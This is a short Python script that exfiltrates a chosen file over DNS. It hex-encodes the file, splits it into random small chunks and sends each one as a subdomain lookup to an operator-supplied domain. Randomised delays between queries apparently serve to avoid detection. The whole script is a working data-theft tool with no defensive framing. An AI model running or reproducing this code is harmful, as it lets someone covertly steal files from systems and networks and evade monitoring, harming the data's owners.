#!/bin/python3

import client
import argparse
import binascii
import random
import time

parser = argparse.ArgumentParser(description = 'File')
parser.add_argument('domain', metavar='Domain', nargs=1, help='Domain to extract to')
parser.add_argument('filename', metavar='Filename', nargs=1, help='Target file to extract')

args = parser.parse_args()

with open(args.filename[0], 'rb') as file:
	content = file.read()

hex = str(binascii.hexlify(content))[2:-1]

deliverables = []

min = 2
max = 7
prev = 0
while True:
    n = random.randint(min, max)
    deliverables.append(hex[prev:prev+n])
    prev = prev + n
    if prev >= len(hex)-1:
        break


for deliverable in deliverables:
	query = str(client.query(deliverable + "." + args.domain[0], "A"))
	print(deliverable + "." + args.domain[0] + ": " + query)
	time.sleep(random.randint(10, 60))
